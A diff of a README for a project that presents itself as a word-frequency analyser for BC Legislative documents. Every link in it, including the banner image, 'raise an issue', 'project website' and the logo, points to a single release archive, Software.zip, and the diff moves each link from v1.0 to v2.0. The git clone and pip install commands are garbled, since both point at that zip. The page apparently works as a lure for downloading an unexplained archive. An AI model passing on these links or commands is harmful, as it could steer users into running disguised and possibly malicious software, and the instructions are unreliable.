@@ -1,6 +1,6 @@
 # Web Scraping and Word Frequencies 📊
 
-![Web Scraping and Word Frequencies](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip)
+![Web Scraping and Word Frequencies](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip)
 
 Welcome to the "Web-Scraping-and-Word-Frequencies" repository! This project is all about analyzing word frequencies in BC Legislative documents using Stanford CoreNLP and Python. The program leverages natural language processing techniques to extract text from PDF documents, process it, and generate a comprehensive word frequency analysis.
 
@@ -27,7 +27,7 @@ Welcome to the "Web-Scraping-and-Word-Frequencies" repository! This project is a
 
 ## Installation 🧰
 
-To get started with this project, you can download the project files by clicking [here](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip). Once downloaded, you can extract the files and start exploring the codebase.
+To get started with this project, you can download the project files by clicking [here](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip). Once downloaded, you can extract the files and start exploring the codebase.
 
 If the link requires launching, please download the zip file and extract it to your desired location.
 
@@ -37,12 +37,12 @@ If the provided link is not working, make sure to check the "Releases" section o
 
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip
+   git clone https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip
    ```
 
 2. Install the necessary Python dependencies.
    ```bash
-   pip install -r https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip
+   pip install -r https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip
    ```
 
 3. Run the program and start analyzing word frequencies in BC Legislative documents!
@@ -61,11 +61,11 @@ If you want to contribute to this project, feel free to fork the repository and 
 
 ## Support 📧
 
-If you encounter any issues or have any questions regarding this project, please feel free to [raise an issue](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip) in the repository. We are always here to help.
+If you encounter any issues or have any questions regarding this project, please feel free to [raise an issue](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip) in the repository. We are always here to help.
 
 ## Stay Updated 📅
 
-For the latest updates and announcements about this project, make sure to watch the repository. You can also visit the [project website](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip) for additional information.
+For the latest updates and announcements about this project, make sure to watch the repository. You can also visit the [project website](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip) for additional information.
 
 ---
 
@@ -75,4 +75,4 @@ Thank you for being a part of this journey! 🌟
 
 ---
 
-![Web Scraping and Word Frequencies Logo](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v1.0/Software.zip)
+![Web Scraping and Word Frequencies Logo](https://github.com/viveklivingstone/Web-Scraping-and-Word-Frequencies/releases/download/v2.0/Software.zip)
